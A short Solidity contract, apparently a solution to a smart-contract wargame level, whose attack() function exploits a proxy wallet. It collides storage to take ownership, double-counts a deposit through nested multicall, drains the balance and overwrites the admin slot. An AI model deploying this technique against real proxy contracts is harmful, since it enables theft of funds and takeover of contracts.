//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IProxy {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract GXT {

    IProxy proxy;
    constructor(IProxy _proxy) payable {
        proxy = _proxy;
    }

    function attack() external {
        
        proxy.proposeNewAdmin(address(this));
        proxy.addToWhitelist(address(this));

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(proxy.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
    
        data[1] = abi.encodeWithSelector(proxy.multicall.selector, deposit_data);
        proxy.multicall{value: 0.001 ether}(data);

        proxy.execute(msg.sender, 0.002 ether, "");
        proxy.setMaxBalance(uint256(uint160(msg.sender)));

        selfdestruct(payable(tx.origin));
    }

}
